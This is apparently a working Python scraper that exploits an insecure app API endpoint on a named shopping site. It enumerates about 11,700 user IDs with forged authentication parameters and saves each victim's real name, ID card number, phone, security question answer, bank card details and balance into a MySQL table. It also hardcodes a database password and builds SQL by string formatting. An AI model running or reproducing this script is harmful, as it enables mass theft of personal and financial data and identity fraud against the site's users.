#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests,time,re
import hashlib,pymysql,json

class get_user():
    def get_re(self,id_id):
        url="http://www.mybuy588.com/ajax/AppGateway.ashx"
        headers={'Content-Type': 'application/x-www-form-urlencoded','Host': 'www.mybuy588.com','Connection': 'close','User-Agent': 'Mozilla/5.0(Linux;U;Android 2.2.1;en-us;Nexus One Build.FRG83) AppleWebKit/553.1(KHTML,like Gecko) Version/4.0 Mobile Safari/533.1','Expect': '100-continue'}
        data='opt=41&auth=%7B%22loginType%22%3A%221%22%2C%22imei%22%3A%22865166029734707%22%2C%22os%22%3A%22Android%22%2C%22os_version%22%3A%225.0%22%2C%22app_version%22%3A%225.3.37%22%2C%22source_id%22%3A%22Yek_test%22%2C%22ver%22%3A%220.9%22%2C%22UID%22%3A%22'+str(id_id)+'%22%2C%22app_key%22%3A%22123456%22%2C%22crc%22%3A%22ab13331755495936ff50785f5b5296a6%22%2C%22time_stamp%22%3A%2220190424024020%22%7D&info=%7B%7D'
        value=requests.post(url=url,headers=headers,data=data)
        value=value.text
        return value
if __name__ == '__main__':
    conn = pymysql.connect(host='localhost', port=3306, user='root', passwd='Leng9s9bxs', db='test', charset='utf8')
    cu = conn.cursor()
    for i in range(1,11704):
        try:
            data=get_user()
            value=data.get_re(i)
            s=json.loads(value)
            #print(s)
            #print(s['error'])
            if s['error'] == '0':
                #print('aaa')
                cu.execute(
                    "replace into data_xiaofeng(id_id,name_name,mobile,qqnumber,realityName,idCardnumber,securityquestion,securityQuestionId,securityQuestionAnswer,bankUserName,bankCardNumber,provinceName,cityName,bankTypeName,branchBankName,userAllowHandsel,cashWithdrawal,balance) values('{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}','{}')".format(
                        i, s['name'], s['mobile'], s['qqnumber'], s['realityName'], s['idCardnumber'],
                        s['securityquestion'],
                        s['securityQuestionId'], s['securityQuestionAnswer'], s['bankUserName'], s['bankCardNumber'],
                        s['provinceName'], s['cityName'], s['bankTypeName'], s['branchBankName'], s['userAllowHandsel'],
                        s['cashWithdrawal'], s['balance']))
                conn.commit()

        except:()
    conn.close()
